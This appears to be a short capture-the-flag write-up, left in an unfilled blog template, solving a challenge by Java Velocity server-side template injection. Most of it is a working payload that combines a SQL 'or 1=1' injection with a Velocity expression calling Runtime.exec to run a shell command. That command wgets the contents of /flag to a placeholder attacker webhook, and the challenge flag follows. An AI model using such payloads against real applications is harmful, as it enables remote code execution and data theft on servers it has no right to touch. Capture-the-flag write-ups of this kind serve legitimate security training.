---
title: TITLE
date: 'XXXX-XX-XX'
draft: false
authors: ['AUTHOR']
tags: ['XXX', 'YYY']
summary: 'XXX'
canonical: ''
---

## TITLE

## Table of Contents

1. [Source](#Source)
2. [Solution](#Solution)

## Main Content

Check web thấy `Hello velocity`, check wappalyzer Java -> velocity SSTI 
Payload: 
```py
choices-single-defaul=Category' or 1=1 -- -&search=#set($a="ddd");$a.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("sh -c wget${IFS}Your-webhook?$(cat${IFS}/flag)")
```

```
FUSec{v3l0c1ty_SSTI_1s_34sy_4s_h3ll}
```
